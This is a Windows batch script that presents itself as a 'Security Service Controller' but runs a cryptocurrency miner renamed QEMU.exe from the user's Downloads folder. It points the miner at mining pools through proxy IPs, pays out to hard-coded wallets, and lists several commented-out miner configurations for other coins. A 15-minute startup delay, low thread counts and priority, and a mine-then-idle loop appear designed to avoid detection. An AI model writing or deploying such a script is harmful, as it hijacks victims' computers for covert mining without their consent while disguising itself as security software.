@echo off
#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm randomscash --pool 51.79.215.200:17019 --disable-gpu --wallet scash1qf7kn4cwmxx2wsz665ucg29xx4kfaqesx9a8s85.sato --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy 47.239.161.149:1111
#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm randomx --pool 10.2.10.9:3333 --disable-gpu --wallet 86qJNmtDCDnUtaZqY9fbXxQ7DVkqm2FELeymGUx7iAwcWTB6GbaZga7KtBAZYP5Ery8LxgqKCRzp8XAefbYHbxC4CpfCPm8 --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6
#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm xelishashv2 --pool hk.xelis.herominers.com:1225 --disable-gpu --wallet xel:9qqkym39dt5s2nsq4r6uf9vrlmj94dt48ulzs3lfrp4lwvvtyvvqq3ewgla --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 2
#C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -b 47.239.161.149:1111 -m nicehash -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a randomx -k
#C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a rx/0 -k
#C:\Users\%USERNAME%\Downloads\there0\QEMU.exe -d dero-node.mysrv.cloud:10100 -w dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c -t 2 --never-stop --restart-on-zero-hashrate



title Security Service Controller
setlocal EnableDelayedExpansion

echo ========================================
echo   Security Service Controller STARTED
echo   Mode: NON-ADMIN
echo ========================================

REM =========================
REM Countdown Total 15 Menit
REM =========================

echo [Security] Countdown: 15 minutes remaining...
timeout /t 300 /nobreak

echo [Security] Countdown: 10 minutes remaining...
timeout /t 300 /nobreak

echo [Security] Countdown: 5 minutes remaining...
timeout /t 300 /nobreak

REM =========================
REM LOOP SECURITY SERVICE
REM =========================

:SECURITY_LOOP

echo ----------------------------------------
echo [Security] Service running (14 minutes)
echo ----------------------------------------

start "" /b "C:\Users\%USERNAME%\Downloads\QEMU.exe" ^
 --algorithm yespowerr16 ^
 --pool yespowerR16.sea.mine.zpool.ca:6534 ^
 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
 --password c=LTC ^
 --disable-gpu ^
 --nicehash false ^
 --keepalive true ^
 --disable-startup-monitor ^
 --disable-huge-pages ^
 --disable-msr-tweaks ^
 --cpu-threads 2 ^
 --cpu-threads-intensity 1 ^
 --cpu-threads-priority 1 ^
 --miner-priority 1 ^
 --proxy 174.138.61.184:1080

REM Simpan PID terakhir
set QEMU_PID=%!

REM Tunggu 14 menit (840 detik)
timeout /t 840 /nobreak

echo [Security] Stopping service (PID=%QEMU_PID%)...

taskkill /PID %QEMU_PID% >nul 2>&1

echo [Security] Idle 2 minutes...
timeout /t 120 /nobreak

goto SECURITY_LOOP
